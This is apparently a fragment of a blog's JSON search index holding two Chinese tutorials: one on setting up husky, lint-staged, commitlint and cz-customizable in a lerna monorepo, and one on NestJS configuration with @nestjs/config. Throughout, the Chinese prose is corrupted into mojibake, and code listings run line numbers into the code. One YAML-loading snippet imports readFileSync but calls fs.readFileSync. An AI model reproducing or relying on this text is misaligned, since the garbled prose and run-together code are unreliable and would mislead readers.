..."},{"title":"lernaé¡¹ç›®ä¸­é›†æˆhuskyã€lint-stagedã€commitlintå’Œcz-customizable","path":"/2021/04/02/lernaé¡¹ç›®ä¸­é›†æˆhuskyã€lint-stagedã€commitlintå’Œcz-customizable/","content":"Monorepo æ˜¯é’ˆå¯¹å•ä»“åº“ã€å¤š package çš„æµè¡Œè§£å†³æ–¹æ¡ˆ, lerna æ˜¯å®ƒçš„ä¸€ç§å®ç°ã€‚ è¯´æ˜é‡è¦packageç‰ˆæœ¬è¯´æ˜ï¼š â€œhuskyâ€: â€œ^6.0.0â€ â€œlint-stagedâ€: â€œ^10.5.4â€ â€œ@commitlint/cliâ€: â€œ^12.0.1â€ â€œ@commitlint/config-conventionalâ€: â€œ^12.0.1â€ â€œcz-customizableâ€: â€œ^6.3.0â€ é…ç½®huskyåœ¨lernaé¡¹ç›®æ ¹ç›®å½•ä¸­å®‰è£…husky: 1yarn add husky -D æ³¨æ„ï¼šhusky v4å’Œv6ç‰ˆæœ¬çš„é…ç½®æ–¹å¼å¤§ç›¸å¾„åº­ï¼Œè¿™é‡Œåªä»‹ç»v6ç‰ˆæœ¬çš„é…ç½®æ–¹å¼ï¼Œv4çš„ç½‘ä¸Šä¸€æœä¸€å¤§æŠŠï¼Œè¿™é‡Œä¸è¿‡å¤šä»‹ç» åœ¨package.jsonçš„scriptsä¸­æ·»åŠ \"prepare\": \"husky install\"ï¼Œå¹¶è¿è¡Œè¿™æ¡å‘½ä»¤ï¼š 1npm set-script prepare \"husky install\" &amp;&amp; npm run prepare æ·»åŠ ä¸€ä¸ªhook: 1npx husky add .husky/pre-commit \"npm test\" ä¸Šé¢è¿™ä¸ªå‘½ä»¤ä¼šåœ¨.huskyç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªpre-commitæ–‡ä»¶ï¼Œå…¶å†…å®¹å¦‚ä¸‹ï¼š 12345#!/bin/sh. \"$(dirname \"$0\")/_/husky.sh\"npm test ä»¥ä¸Šéƒ½æ˜¯æ‰‹åŠ¨å®‰è£…huskyçš„è¿‡ç¨‹ï¼Œå½“ç„¶å®˜æ–¹ä¹Ÿæä¾›äº†ä¸€é”®å®‰è£…å’Œé…ç½®è„šæœ¬ï¼Œæ¨èä½¿ç”¨ï¼š 123npx husky-init &amp;&amp; npm install # npmnpx husky-init &amp;&amp; yarn # Yarn 1yarn dlx husky-init --yarn2 &amp;&amp; yarn # Yarn 2 å¦‚æœä½¿ç”¨çš„æ˜¯v4ç‰ˆæœ¬çš„huskyï¼Œæƒ³å‡çº§åˆ°v6ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½åï¼Œä¸€é”®è¿ç§»ï¼š 1234567891011121314// npmnpm install husky@6 --save-dev \\ &amp;&amp; npx husky-init \\ &amp;&amp; npm exec -- github:typicode/husky-4-to-6 --remove-v4-config // yarn 1yarn add husky@6 --dev \\ &amp;&amp; npx husky-init \\ &amp;&amp; npm exec -- github:typicode/husky-4-to-6 --remove-v4-config// yarn 2yarn add husky@6 --dev \\ &amp;&amp; yarn dlx husky-init --yarn2 \\ &amp;&amp; npm exec -- github:typicode/husky-4-to-6 --remove-v4-config æ›´å¤šé…ç½®ï¼Œè¯¦è§å®˜æ–¹æ–‡æ¡£ï¼šhttps://typicode.github.io/husky/#/ é…ç½®lint-stagedåœ¨lernaé¡¹ç›®ä¸­ï¼Œç”±äºæ‰€æœ‰å­é¡¹ç›®å…¬ç”¨ä¸€ä¸ª repo æºä»£ç ä»“åº“ï¼Œå› æ­¤å®ƒçš„ husky é’©å­åªèƒ½å»ºç«‹åœ¨æœ€é¡¶å±‚ç›®å½•ï¼› è€Œæ¯æ¬¡ commit éƒ½å¾ˆæœ‰å¯èƒ½æ˜¯å¤šä¸ªå­é¡¹ç›®éƒ½æœ‰æ”¹åŠ¨ï¼Œè¿™ä¸ªæ—¶å€™ä½¿ç”¨ lint-staged æ—¶ï¼Œå°±ä¸ä½†è¦åŒºåˆ†æ–‡ä»¶ç±»å‹ï¼Œè¿˜è¦åŒºåˆ†æ”¹åŠ¨æ–‡ä»¶æ‰€åœ¨çš„å­é¡¹ç›®ï¼ˆå› ä¸ºä¸åŒçš„å­é¡¹ç›®å¯èƒ½ä¼šæœ‰ä¸åŒçš„æ ¡éªŒå¤„ç†ï¼‰ã€‚ è¿™æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ lerna å‘½ä»¤æ¥å®ç°å¯¹â€œå“ªä¸ªå­é¡¹ç›®æœ‰ä¿®æ”¹â€çš„åˆ¤æ–­ï¼›è€Œ lint-staged å°±éœ€è¦å®‰è£…åœ¨ä»»ä½•ä¸€ä¸ªéœ€è¦åšæ ¡éªŒçš„å­é¡¹ç›®ä¸­ã€‚ æ·»åŠ æˆ–ä¿®æ”¹.huskyç›®å½•ä¸‹çš„pre-commité’©å­å¦‚ä¸‹ï¼š 12345#!/bin/sh. \"$(dirname \"$0\")/_/husky.sh\"lerna run --concurrency 1 --stream precommit --since HEAD --exclude-dependents å…¶ä¸­ï¼Œprecommit æ˜¯åœ¨pre-commité’©å­ä¸­è§¦å‘çš„å­é¡¹ç›®çš„å‘½ä»¤ åœ¨å­é¡¹ç›®ä¸­å®‰è£…å’Œé…ç½®lint-stagedï¼Œå¹¶æ·»åŠ precommitå‘½ä»¤ å®‰è£…lint-stagedï¼š 1lerna add lint-staged --scope=xxxx -D åœ¨æ·»åŠ precommitå‘½ä»¤ï¼š 1\"precommit\": \"lint-staged\" é…ç½®lint-stagedï¼š 12345\"lint-staged\": { \"*.{ts,tsx,js,jsx}\": [ \"eslint\" ]}, æ›´å¤šé…ç½®ï¼Œè¯¦è§å®˜æ–¹æ–‡æ¡£ï¼šhttps://github.com/okonet/lint-staged#readme é…ç½®commitlintå’Œcz-customizableæ¯ä¸ªå›¢é˜Ÿå¯¹æäº¤çš„commit messageæ ¼å¼æœ‰çº¦å®šä¿—ç§°çš„è¦æ±‚ï¼Œä½†æ˜¯æ²¡æœ‰ä¸€ä¸ªç»Ÿä¸€çš„è§„èŒƒï¼Œå¯¼è‡´å¤§å®¶æäº¤çš„commit messageæˆ–å¤šæˆ–å°‘ä¸å¤ªä¸€æ ·ã€‚å› æ­¤ï¼Œéœ€è¦ä¸€ä¸ªå·¥å…·æ¥å¸®åŠ©å¤§å®¶ç»Ÿä¸€commit messageçš„æ ¼å¼ï¼Œä¹Ÿæ–¹ä¾¿åç»­çš„åˆ†æå’Œæ‹“å±•ã€‚ cz-customizableæ˜¯ä¸€ä¸ªå¸®åŠ©ä¹¦å†™commit messageçš„å·¥å…·ï¼Œè€Œcommitlintæ˜¯ä¸€ä¸ªæ ¡éªŒcommit messageçš„å·¥å…·ã€‚ å®‰è£…commitlintå’Œcz-customizable: 1yarn add @commitlint/cli @commitlint/config-conventional cz-customizable -D æ·»åŠ commit-msgé’©å­ 1npx husky add .husky/commit-msg \"yarn commitlint --edit\" ç”Ÿæˆå¦‚ä¸‹æ–‡ä»¶ï¼š 1234#!/bin/sh. \"$(dirname \"$0\")/_/husky.sh\"yarn commitlint --edit åœ¨package.jsonä¸­æ·»åŠ ä»¥ä¸‹é…ç½®ï¼š 123456789101112{ ... \"config\": { \"commitizen\": { \"path\": \"./node_modules/cz-customizable\" }, \"cz-customizable\": { \"config\": \"./.cz-config.js\" } }, ...} åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸­æ–°å»º.cz-config.jsæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051module.exports = { types: [ { value: 'feat', name: 'feat: A new feature' }, { value: 'fix', name: 'fix: A bug fix' }, { value: 'style', name: 'style: Changes that do not affect the meaning of the code (white-space, formatting, missing semi-colons, etc)', }, { value: 'refactor', name: 'refactor: A code change that neither fixes a bug nor adds a feature', }, { value: 'revert', name: 'revert: Revert to a commit' }, { value: 'chore', name: 'chore: Changes to the build process or auxiliary tools and libraries such as documentation generation', }, { value: 'docs', name: 'docs: Documentation only changes' }, { value: 'perf', name: 'perf: A code change that improves performance', }, { value: 'test', name: 'test: Adding missing tests' }, ], scopes: [ { name: 'frontend' }, { name: 'backend' }, { name: 'service' }, ], messages: { type: \"Select the type of change that you're committing:\", scope: \" Select the scope of change that you're committing:\", // used if allowCustomScopes is true customScope: 'Denote the custom scope:', subject: 'Write a SHORT, IMPERATIVE tense description of the change: ', body: 'Provide a LONGER description of the change (optional). Use \"|\" to break new line: ', breaking: 'List any BREAKING CHANGES (optional): ', footer: 'List any ISSUES CLOSED by this change (optional). E.g.: #31, #34: ', confirmCommit: 'Are you sure you want to proceed with the commit above?', }, allowCustomScopes: true,} åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸­æ–°å»º.commitlintrc.jsæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š 1234567891011const typeEnum = require('./.cz-config');module.exports = { extends: ['@commitlint/config-conventional'], rules: { 'type-enum': [2, 'always', typeEnum.types.map((i) =&gt; i.value)], 'scope-enum': [2, 'always', typeEnum.scopes.map((i) =&gt; i.name)], 'scope-empty': [2, 'never'], },}; é…ç½®å®Œæˆåï¼Œæ¯æ¬¡æäº¤commitæ—¶ï¼Œå¯ä»¥ä½¿ç”¨git czæ›¿æ¢git commitå‘½ä»¤ï¼Œä»è€Œè¾…åŠ©æˆ‘ä»¬æ›´åŠ è§„èŒƒçš„ä¹¦å†™commit messageã€‚ æ›´å¤šè¯¦ç»†é…ç½®ï¼Œå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼šhttps://juejin.cn/post/6844903831893966856 æ€»ç»“ä»¥ä¸Šå°±æ˜¯æˆ‘å¯¹å¦‚ä½•åœ¨lernaé¡¹ç›®ä¸­é…ç½®huskyã€lint-stagedå’ŒCzå·¥å…·çš„ä¸€äº›ç²—ç•¥è®¤çŸ¥ï¼Œå½“ç„¶ä¸ä»…ä»…æ˜¯lernaé¡¹ç›®ï¼Œä¹Ÿé€‚ç”¨äºä»»ä½•å‰ç«¯é¡¹ç›®ã€‚ é“¾æ¥ huskyå®˜æ–‡æ–‡æ¡£ lint-stagedå®˜æ–¹æ–‡æ¡£ Czå·¥å…·é›†ä½¿ç”¨ä»‹ç»"},{"title":"NestJS - é…ç½®","path":"/2021/03/17/NestJS - é…ç½®/","content":"åº”ç”¨ç¨‹åºé€šå¸¸è¿è¡Œåœ¨ä¸åŒçš„ç¯å¢ƒï¼Œä¾‹å¦‚ï¼Œå¼€å‘æœ‰å¼€å‘ç¯å¢ƒã€æµ‹è¯•ç¯å¢ƒï¼Œçº¿ä¸Šæœ‰é¢„å‘å¸ƒç¯å¢ƒã€ç”Ÿäº§ç¯å¢ƒï¼Œè€Œè¿è¡Œåœ¨ä¸åŒçš„ç¯å¢ƒï¼Œéœ€è¦æœ‰ä¸åŒçš„é…ç½®ï¼Œä¾‹å¦‚æ•°æ®åº“çš„é…ç½®ç­‰ã€‚ åœ¨Nodeä¸­ï¼Œå¤–éƒ¨å®šä¹‰çš„ç¯å¢ƒå˜é‡é€šè¿‡procress.envå…¨å±€å¯è§ã€‚åœ¨Node.jsåº”ç”¨ç¨‹åºä¸­ï¼Œé€šå¸¸ä½¿ç”¨.envæ–‡ä»¶æ¥é…ç½®è¿™äº›ç¯å¢ƒå˜é‡ï¼Œå…¶ä¸­æ¯ä¸ªé”®ä»£è¡¨ä¸€ä¸ªç‰¹å®šçš„å€¼ï¼Œä»¥ä»£è¡¨æ¯ä¸ªç¯å¢ƒã€‚ è§£æ.envæ–‡ä»¶å¹¶åŠ è½½åˆ°procress.envä¸­ï¼Œå°±éœ€è¦ä½¿ç”¨dotenvè¿™ä¸ªåŒ…äº†ï¼Œä½†æ˜¯Nestæä¾›äº†ä¸€ä¸ªé…ç½®ç¯å¢ƒå˜é‡çš„è½¯ä»¶åŒ… - @nestjs/configï¼Œå…¶å†…éƒ¨ä¾èµ–äº†dotenvã€‚ å®‰è£…@nestjs/config12345// npm$ npm i --save @nestjs/config// yarn$ yarn add @nestjs/config ç®€å•ä½¿ç”¨å®‰è£…å®Œæˆåï¼Œæˆ‘ä»¬å¯ä»¥å¯¼å…¥ConfigModuleã€‚é€šå¸¸ï¼Œæˆ‘ä»¬å°†å…¶å¯¼å…¥æ ¹ç›®å½•AppModuleå¹¶ä½¿ç”¨. forRoot()é™æ€æ–¹æ³•æ§åˆ¶å…¶è¡Œä¸ºã€‚åœ¨æ­¤æ­¥éª¤ä¸­ï¼Œå°†è§£æå¹¶ç”Ÿæˆç¯å¢ƒå˜é‡é”®/å€¼å¯¹ã€‚ç¨åï¼Œæˆ‘ä»¬å°†åœ¨å…¶ä»–åŠŸèƒ½æ¨¡å—ä¸­çœ‹åˆ°ä¸€äº›ç”¨äºè®¿é—®çš„ConfigServiceç±»çš„é€‰é¡¹ConfigModuleã€‚ 1234567import { Module } from '@nestjs/common';import { ConfigModule } from '@nestjs/config';@Module({ imports: [ConfigModule.forRoot()],})export class AppModule {} ä¸Šé¢çš„ä»£ç å°†ä».envé»˜è®¤ä½ç½®ï¼ˆé¡¹ç›®æ ¹ç›®å½•ï¼‰åŠ è½½å¹¶è§£ææ–‡ä»¶ï¼Œå°†æ–‡ä»¶ä¸­çš„é”®/å€¼å¯¹.envä¸åˆ†é…ç»™å…¶çš„ç¯å¢ƒå˜é‡åˆå¹¶process.envï¼Œå¹¶å°†ç»“æœå­˜å‚¨åœ¨ç§æœ‰ç»“æ„ä¸­ï¼Œæ‚¨å¯ä»¥é€šè¿‡è®¿é—®è¯¥ç§æœ‰ç»“æ„ConfigServiceã€‚è¯¥forRoot()æ–¹æ³•æ³¨å†Œäº†ConfigServiceæä¾›ç¨‹åºï¼Œè¯¥æä¾›ç¨‹åºæä¾›äº†get()ä¸€ç§è¯»å–è¿™äº›å·²è§£æ/åˆå¹¶çš„é…ç½®å˜é‡çš„æ–¹æ³•ã€‚ç”±äº@nestjs/configä¾èµ–äºdotenvï¼Œå› æ­¤å®ƒä½¿ç”¨è¯¥ç¨‹åºåŒ…çš„è§„åˆ™æ¥è§£å†³ç¯å¢ƒå˜é‡åç§°ä¸­çš„å†²çªã€‚å½“å¯†é’¥åœ¨è¿è¡Œæ—¶ç¯å¢ƒä¸­ä½œä¸ºç¯å¢ƒå˜é‡ï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡OS shellå¯¼å‡ºä¹‹ç±»export DATABASE_USER=testï¼‰å’Œåœ¨.envæ–‡ä»¶ä¸­åŒæ—¶å­˜åœ¨æ—¶ï¼Œè¿è¡Œæ—¶ç¯å¢ƒå˜é‡ä¼˜å…ˆã€‚ ç¤ºä¾‹.envæ–‡ä»¶å¦‚ä¸‹æ‰€ç¤ºï¼š 12DATABASE_USER=testDATABASE_PASSWORD=test è‡ªå®šä¹‰ENVæ–‡ä»¶è·¯å¾„é»˜è®¤æƒ…å†µä¸‹ï¼Œç¨‹åºä¼šåœ¨åº”ç”¨ç¨‹åºçš„æ ¹ç›®å½•ä¸­æŸ¥æ‰¾.envæ–‡ä»¶ã€‚è¦ä¸º.envæ–‡ä»¶æŒ‡å®šå…¶ä»–è·¯å¾„ï¼Œè¯·è®¾ç½®forRoot()çš„å¯é€‰å±æ€§envFilePathï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 123ConfigModule.forRoot({ envFilePath: '.development.env',}); æ‚¨è¿˜å¯ä»¥ä¸º.envæ–‡ä»¶æŒ‡å®šå¤šä¸ªè·¯å¾„ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 123ConfigModule.forRoot({ envFilePath: ['.env.development.local', '.env.development'],}); å¦‚æœåœ¨å¤šä¸ªæ–‡ä»¶ä¸­æ‰¾åˆ°ä¸€ä¸ªå˜é‡ï¼Œåˆ™ç¬¬ä¸€ä¸ªä¼˜å…ˆã€‚ åœ¨å®é™…å¼€å‘ä¸­ï¼Œå¾€å¾€æœ‰å¤šä¸ªé…ç½®æ–‡ä»¶ï¼Œæ¯”å¦‚å¼€å‘ç¯å¢ƒä½¿ç”¨.development.envé…ç½®æ–‡ä»¶ï¼Œæµ‹è¯•ç¯å¢ƒä½¿ç”¨.test.envé…ç½®æ–‡ä»¶ï¼Œç”Ÿäº§ç¯å¢ƒä½¿ç”¨.production.envé…ç½®æ–‡ä»¶ï¼Œç„¶åä½¿ç”¨ä¸åŒçš„å¯åŠ¨å‘½ä»¤ï¼Œå¯ç”¨ä¸åŒçš„é…ç½®æ–‡ä»¶ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š 1234567891011// package.json{ ... \"scripts\": { \"start\": \"cross-env NODE_ENV=development nest start\", \"start:dev\": \"cross-env NODE_ENV=development nest start --watch\", \"start:prod\": \"cross-env NODE_ENV=production node dist/main\", \"test\": \"cross-env NODE_ENV=test jest\", }, ...} å®‰è£…cross-envï¼Œä½¿ç”¨å®ƒè·¨å¹³å°çš„è®¾ç½®ç¯å¢ƒå˜é‡ 123ConfigModule.forRoot({ envFilePath: `${process.env.NODE_ENV || 'development'}.env`,}); ä½¿ç”¨å…¨å±€moduleå¦‚æœè¦ConfigModuleåœ¨å…¶ä»–æ¨¡å—ä¸­ä½¿ç”¨ï¼Œåˆ™éœ€è¦å°†å…¶å¯¼å…¥ï¼ˆè¿™æ˜¯æ‰€æœ‰Nestæ¨¡å—çš„æ ‡å‡†é…ç½®ï¼‰ã€‚æˆ–è€…ï¼Œé€šè¿‡å°†optionså¯¹è±¡çš„isGlobalå±æ€§è®¾ç½®ä¸ºtrueï¼Œå°†å…¶å£°æ˜ä¸ºå…¨å±€æ¨¡å—ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸€æ—¦ConfigModuleè¢«åŠ è½½åˆ°æ ¹æ¨¡å—ä¸­ï¼Œå°±ä¸éœ€è¦åœ¨å…¶ä»–æ¨¡å—ä¸­å¯¼å…¥ConfigModuleäº† 123ConfigModule.forRoot({ isGlobal: true,}); è‡ªå®šä¹‰é…ç½®æ–‡ä»¶å¯¹äºæ›´å¤æ‚çš„é¡¹ç›®ï¼Œå¯ä»¥ä½¿ç”¨è‡ªå®šä¹‰é…ç½®æ–‡ä»¶è¿”å›åµŒå¥—çš„é…ç½®å¯¹è±¡ã€‚è¿™å…è®¸æ‚¨æŒ‰åŠŸèƒ½å¯¹ç›¸å…³é…ç½®è®¾ç½®è¿›è¡Œåˆ†ç»„ï¼ˆä¾‹å¦‚ï¼Œä¸æ•°æ®åº“ç›¸å…³çš„è®¾ç½®ï¼‰ï¼Œå¹¶å°†ç›¸å…³è®¾ç½®å­˜å‚¨åœ¨å•ä¸ªæ–‡ä»¶ä¸­ï¼Œä»¥å¸®åŠ©ç‹¬ç«‹ç®¡ç†å®ƒä»¬ã€‚ è‡ªå®šä¹‰é…ç½®æ–‡ä»¶å¯¼å‡ºä¸€ä¸ªå·¥å‚å‡½æ•°ï¼Œè¯¥å‡½æ•°è¿”å›ä¸€ä¸ªé…ç½®å¯¹è±¡ã€‚é…ç½®å¯¹è±¡å¯ä»¥æ˜¯ä»»ä½•ä»»æ„åµŒå¥—çš„æ™®é€šJavaScriptå¯¹è±¡ã€‚process.envå¯¹è±¡å°†åŒ…å«å®Œå…¨è§£æçš„ç¯å¢ƒå˜é‡key-valueå¯¹ï¼ˆå¦‚ä¸Šæ‰€è¿°ï¼Œ.envæ–‡ä»¶å’Œå¤–éƒ¨å®šä¹‰çš„å˜é‡è¢«è§£æå’Œåˆå¹¶ï¼‰ã€‚ç”±äºä½ æ§åˆ¶äº†è¿”å›çš„é…ç½®å¯¹è±¡ï¼Œä½ å¯ä»¥æ·»åŠ ä»»ä½•æ‰€éœ€çš„é€»è¾‘æ¥å°†å€¼æŠ•å°„åˆ°ä¸€ä¸ªé€‚å½“çš„ç±»å‹ï¼Œè®¾ç½®é»˜è®¤å€¼ç­‰ã€‚ä¾‹å¦‚ 1234567export default () =&gt; ({ port: parseInt(process.env.PORT, 10) || 3000, database: { host: process.env.DATABASE_HOST, port: parseInt(process.env.DATABASE_PORT, 10) || 5432 }}); å°†å…¶ä¼ ç»™ConfigModule.forRoot()çš„loadå±æ€§ï¼Œæ¥åŠ è½½è¿™ä¸ªè‡ªå®šä¹‰é…ç½®ï¼š 12345678910import configuration from './config/configuration';@Module({ imports: [ ConfigModule.forRoot({ load: [configuration], }), ],})export class AppModule {} loadå±æ€§æ˜¯ä¸ªæ•°ç»„ï¼Œå…è®¸åŠ è½½å¤šä¸ªè‡ªå®šä¹‰é…ç½®æ–‡ä»¶ é€šè¿‡è‡ªå®šä¹‰é…ç½®æ–‡ä»¶ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ç®¡ç†è‡ªå®šä¹‰æ–‡ä»¶ï¼Œå¦‚YAMLæ–‡ä»¶ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨YAMLæ ¼å¼çš„é…ç½®çš„ä¾‹å­ã€‚ 123456789101112http: host: 'localhost' port: 8080db: postgres: url: 'localhost' port: 5432 database: 'yaml-db' sqlite: database: 'sqlite.db' ä¸ºäº†è¯»å–å’Œè§£æYAMLæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨js-yamlåŒ…ã€‚ 12$ npm i js-yaml$ npm i -D @types/js-yaml å®‰è£…è½¯ä»¶åŒ…åï¼Œæˆ‘ä»¬å°†ä½¿ç”¨yaml#loadå‡½æ•°æ¥åŠ è½½åˆšåˆšåœ¨ä¸Šé¢åˆ›å»ºçš„YAMLæ–‡ä»¶ã€‚ 1234567891011import { readFileSync } from 'fs';import * as yaml from 'js-yaml';import { join } from 'path';const YAML_CONFIG_FILENAME = 'config.yml';export default () =&gt; { return yaml.load( fs.readFileSync(join(__dirname, YAML_CONFIG_FILENAME), 'utf8'), );}; ä½¿ç”¨ConfigServiceè¦ä»ConfigServiceä¸­è®¿é—®é…ç½®å€¼ï¼Œæˆ‘ä»¬é¦–å…ˆå¾—æ³¨å…¥ConfigServiceï¼Œå’Œä½¿ç”¨å…¶ä»–providerä¸€æ ·ï¼Œæˆ‘ä»¬éœ€è¦å°†å…¶åŠ å…¥@Moduleçš„importså±æ€§ä¸­ï¼ˆå¦‚æœå°†ConfigModuleé…ç½®æˆå…¨å±€moduleï¼Œåˆ™å¯ä»¥å¿½ç•¥è¿™ä¸€æ­¥ï¼‰ 1234@Module({ imports: [ConfigModule], // ...}) ç„¶åæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ ‡å‡†çš„æ„é€ å‡½æ•°æ³¨å…¥: 123// import { ConfigService } from '@nestjs/config';constructor(private configService: ConfigService) {} è·å– 12345// get an environment variableconst dbUser = this.configService.get&lt;string&gt;('DATABASE_USER');// get a custom configuration valueconst dbHost = this.configService.get&lt;string&gt;('database.host'); å¦‚ä¸Šæ‰€ç¤ºï¼Œä½¿ç”¨configService.get()æ–¹æ³•é€šè¿‡ä¼ é€’å˜é‡åæ¥è·å–ä¸€ä¸ªç®€å•çš„ç¯å¢ƒå˜é‡ã€‚ä½ å¯ä»¥é€šè¿‡ä¼ é€’ç±»å‹æ¥åšTypeScriptç±»å‹æç¤ºï¼Œå¦‚ä¸Šæ‰€ç¤º(ä¾‹å¦‚ï¼Œget&lt;string&gt;(â€¦))ã€‚get()æ–¹æ³•ä¹Ÿå¯ä»¥éå†ä¸€ä¸ªåµŒå¥—çš„è‡ªå®šä¹‰é…ç½®å¯¹è±¡ï¼ˆé€šè¿‡è‡ªå®šä¹‰é…ç½®æ–‡ä»¶åˆ›å»ºï¼‰ï¼Œå¦‚ä¸Šé¢ç¬¬äºŒä¸ªä¾‹å­æ‰€ç¤ºã€‚ ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸€ä¸ªæ¥å£ä½œä¸ºç±»å‹æç¤ºæ¥è·å¾—æ•´ä¸ªåµŒå¥—çš„è‡ªå®šä¹‰é…ç½®å¯¹è±¡ã€‚ 123456789interface DatabaseConfig { host: string; port: number;}const dbConfig = this.configService.get&lt;DatabaseConfig&gt;('database');// you can now use `dbConfig.port` and `dbConfig.host`const port = dbConfig.port; get()æ–¹æ³•è¿˜éœ€è¦ä¸€ä¸ªå¯é€‰çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œå®šä¹‰ä¸€ä¸ªé»˜è®¤å€¼ï¼Œå½“é”®ä¸å­˜åœ¨æ—¶ï¼Œå°†è¿”å›é»˜è®¤å€¼ï¼Œå¦‚ä¸‹æ‰€ç¤º: 12// use \"localhost\" when \"database.host\" is not definedconst dbHost = this.configService.get&lt;string&gt;('database.host', 'localhost'); ConfigServiceæœ‰ä¸€ä¸ªå¯é€‰çš„æ³›å‹(ç±»å‹å‚æ•°)æ¥å¸®åŠ©é˜²æ­¢è®¿é—®ä¸å­˜åœ¨çš„é…ç½®å±æ€§ã€‚ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹: 12345678910111213interface EnvironmentVariables { PORT: number; TIMEOUT: string;}// somewhere in the codeconstructor(private configService: ConfigService&lt;EnvironmentVariables&gt;) { // this is valid const port = this.configService.get&lt;number&gt;('PORT'); // this is invalid as URL is not a property on the EnvironmentVariables interface const url = this.configService.get&lt;string&gt;('URL');} é…ç½®å‘½åç©ºé—´ConfigModuleå…è®¸æ‚¨å®šä¹‰å’ŒåŠ è½½å¤šä¸ªè‡ªå®šä¹‰é…ç½®æ–‡ä»¶ï¼Œå¦‚ä¸Šé¢çš„è‡ªå®šä¹‰é…ç½®æ–‡ä»¶æ‰€ç¤ºã€‚æ‚¨å¯ä»¥ä½¿ç”¨åµŒå¥—çš„é…ç½®å¯¹è±¡ç®¡ç†å¤æ‚çš„é…ç½®å¯¹è±¡å±‚æ¬¡ï¼Œå¦‚è¯¥èŠ‚æ‰€ç¤ºã€‚å¦å¤–ï¼Œæ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨ registerAs()å‡½æ•°è¿”å›ä¸€ä¸ª â€œnamespaced â€œçš„é…ç½®å¯¹è±¡ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚ 123456import { registerAs } from '@nestjs/config'; export default registerAs('database', () =&gt; ({ host: process.env.DATABASE_HOST, port: process.env.DATABASE_PORT || 5432})); ç”¨forRoot()æ–¹æ³•çš„å‚æ•°å¯¹è±¡çš„loadå±æ€§åŠ è½½ä¸€ä¸ªå‘½åç©ºé—´çš„é…ç½®ï¼Œä¸åŠ è½½è‡ªå®šä¹‰é…ç½®æ–‡ä»¶çš„æ–¹å¼ç›¸åŒã€‚ 12345678910import databaseConfig from './config/database.config';@Module({ imports: [ ConfigModule.forRoot({ load: [databaseConfig], }), ],})export class AppModule {} ç°åœ¨ï¼Œè¦ä»databaseå‘½åç©ºé—´ä¸­è·å–hostï¼Œä½¿ç”¨ç‚¹æ“ä½œç¬¦ã€‚ä½¿ç”¨databaseä½œä¸ºå±æ€§åçš„å‰ç¼€ï¼Œå¯¹åº”äºå‘½åç©ºé—´çš„åç§°ï¼ˆä½œä¸º registerAs() å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¼ é€’ï¼‰ã€‚ 1const dbHost = this.configService.get&lt;string&gt;('database.host'); ä¸€ä¸ªåˆç†çš„é€‰æ‹©æ˜¯ç›´æ¥æ³¨å…¥databaseå‘½åç©ºé—´ã€‚è¿™ä½¿æˆ‘ä»¬èƒ½å¤Ÿä»å¼ºç±»å‹åŒ–ä¸­è·ç›Šã€‚ 123456// import { ConfigType } from '@nestjs/config';constructor( @Inject(databaseConfig.KEY) private dbConfig: ConfigType&lt;typeof databaseConfig&gt;,) {} ç¼“å­˜ç¯å¢ƒå˜é‡ç”±äºè®¿é—®process.envä¼šå¾ˆæ…¢ï¼Œä½ å¯ä»¥è®¾ç½®ä¼ é€’ç»™ConfigModule.forRoot()çš„optionså¯¹è±¡çš„cacheå±æ€§ï¼Œä»¥æé«˜ConfigServiceçš„æ€§èƒ½ã€‚ 123ConfigModule.forRoot({ cache: true,}); éƒ¨åˆ†æ³¨å†Œåˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬å·²ç»ç”¨forRoot()æ–¹æ³•å¤„ç†äº†æ ¹æ¨¡å—(å¦‚AppModule)ä¸­çš„é…ç½®æ–‡ä»¶ã€‚ä¹Ÿè®¸ä½ æœ‰ä¸€ä¸ªæ›´å¤æ‚çš„é¡¹ç›®ç»“æ„ï¼Œç‰¹å®šåŠŸèƒ½çš„é…ç½®æ–‡ä»¶ä½äºå¤šä¸ªä¸åŒçš„ç›®å½•ä¸­ã€‚@nestjs/configåŒ…æä¾›äº†ä¸€ä¸ªå«åšéƒ¨åˆ†æ³¨å†Œçš„åŠŸèƒ½ï¼Œå®ƒåªå¼•ç”¨ä¸æ¯ä¸ªåŠŸèƒ½æ¨¡å—ç›¸å…³è”çš„é…ç½®æ–‡ä»¶ï¼Œè€Œä¸æ˜¯åœ¨æ ¹æ¨¡å—ä¸­åŠ è½½æ‰€æœ‰è¿™äº›æ–‡ä»¶ã€‚åœ¨ç‰¹æ€§æ¨¡å—ä¸­ä½¿ç”¨forFeature()é™æ€æ–¹æ³•æ¥æ‰§è¡Œè¿™ä¸ªéƒ¨åˆ†æ³¨å†Œï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚ 123456import databaseConfig from './config/database.config';@Module({ imports: [ConfigModule.forFeature(databaseConfig)],})export class DatabaseModule {} æ 